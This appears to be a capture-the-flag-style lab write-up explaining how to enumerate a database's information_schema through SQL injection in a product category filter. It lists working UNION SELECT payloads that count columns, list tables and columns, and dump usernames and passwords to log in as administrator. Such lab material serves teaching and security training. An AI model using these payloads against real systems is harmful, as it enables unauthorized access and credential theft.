Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.
We can query through the information schema:<br>
``SELECT * FROM information_schema.tables``
This returns output like the following:

<table border="1">
  <tr>
    <th>TABLE_CATALOG</th>
    <th>TABLE_SCHEMA</th>
    <th>TABLE_NAME</th>
    <th>TABLE_TYPE</th>
  </tr>
  <tr>
    <td>MyDatabase</td>
    <td>dbo</td>
    <td>Products</td>
    <td>BASE TABLE</td>
  </tr>
  <tr>
    <td>MyDatabase</td>
    <td>dbo</td>
    <td>Users</td>
    <td>BASE TABLE</td>
  </tr>
  <tr>
    <td>MyDatabase</td>
    <td>dbo</td>
    <td>Feedback</td>
    <td>BASE TABLE</td>
  </tr>
</table>

This output indicates that there are three tables, called **_Products, Users, and Feedback._**

You can then query information_schema.columns to list the columns in individual tables:

``SELECT * FROM information_schema.columns WHERE table_name = 'Users'``


<br>

**<h2>Problem:</h2>**
This lab contains a SQL injection vulnerability in the product category filter. The application has a login function, and the database contains a table that holds usernames and passwords. 

**<h2>Goal:</h2>**
We need to determine the _**name**_ of this table and _**the columns it contains**_, then retrieve the contents of the table to obtain the username and password of all users.
<br>

To solve the lab, log in as the **_administrator_** user

**<h2>Solution:</h2>**
- Check the database type using ``'--`` or ``'#``. 
Produces error on second one so we assume its a non oracle database.
- check number of columns present using ``' order by 1--``. Produces an internall server error for 3 columns so there are only 2 columns present.
- Check whats in each column using ``'union select 'a', NULL--``. Both column have text type data.
- Check for the tables present in the columns using: 
``'union select table_name, NULL from information_schema.tables--`` which produces a huge list of tables; out of the tables shown we find ``users_bmquvo`` , so testing query for its content.
![alt text](/images/lab5listingtables.png)
- Check the column names from the table using : ``'union select column_name, NULL from information_schema.columns where table_name='users_bmquvo'--``, this produces these columns: 
![alt text](/images/lab5listingcolumns.png)
- Now check the password of the username given: <br>
``' union select username_yvxtai, password_bvkxeo from users_bmquvo--``, which produces the output of username and password in the column
![alt text](/images/lab5usernameandpassword.png)
- Now login with the given credentials for administrator to solve the lab.